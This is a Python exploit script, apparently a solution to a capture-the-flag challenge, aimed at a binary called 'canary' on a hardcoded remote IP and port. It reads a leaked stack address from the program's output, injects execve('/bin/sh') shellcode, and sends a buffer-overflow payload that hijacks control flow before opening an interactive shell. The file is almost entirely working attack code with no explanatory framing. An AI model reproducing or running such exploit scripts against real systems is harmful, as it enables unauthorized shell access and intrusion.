#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./canary')

host = args.HOST or '194.5.207.113'
port = int(args.PORT or 7030)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *printresult+97
continue
'''.format(**locals())

# -- Exploit goes here --
io = start()
sallcode = asm("""
    mov al, 0x3b
    mov rdi, rbp
    xor rsi, rsi
    xor rdx, rdx
    syscall
""")
print(len(sallcode))
re()
sl("/bin/sh\x00" + "P"*8)
re()
sl(sallcode)
reu("Do not you believe? Here is the canary address: ")
stack_leak = int(rl().strip(b'\n'), 16)
log.info(f"stack leak : {hex(stack_leak)}")
f = b"A" * 12 + p64(stack_leak+12) + p64(stack_leak-15)
re(timeout=1000)
sl(f)
io.interactive()

